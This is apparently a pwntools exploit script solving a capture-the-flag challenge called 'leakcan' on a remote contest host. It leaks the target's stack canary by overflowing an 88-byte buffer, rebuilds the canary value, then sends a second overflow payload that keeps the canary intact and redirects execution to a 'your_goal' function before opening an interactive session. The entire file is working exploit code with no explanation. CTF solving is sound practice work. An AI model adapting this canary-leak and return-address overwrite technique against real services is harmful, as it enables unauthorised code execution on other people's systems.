#! /usr/bin/python3
from pwn import *
elf=context.binary=ELF("./leakcan_chall")
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#p=process()
p=remote("leakcan-25b8ac0dd7fd.tcp.1753ctf.com",8435)
p.sendline(cyclic(88))
(p.recvline().decode())
(p.recvline())
leak = (p.recvline())
leak = leak[:leak.index(b"i")].strip()
canary = int.from_bytes(leak, byteorder='little')
canary =(hex(canary)+"00")
print(canary)
canary = "0x"+canary[3:].strip()
print(f"CANARY FOUND : {canary}")
p.send(b"".join([cyclic(88),pack(int(canary,16)),pack(1),pack(elf.sym.your_goal)]))
p.interactive()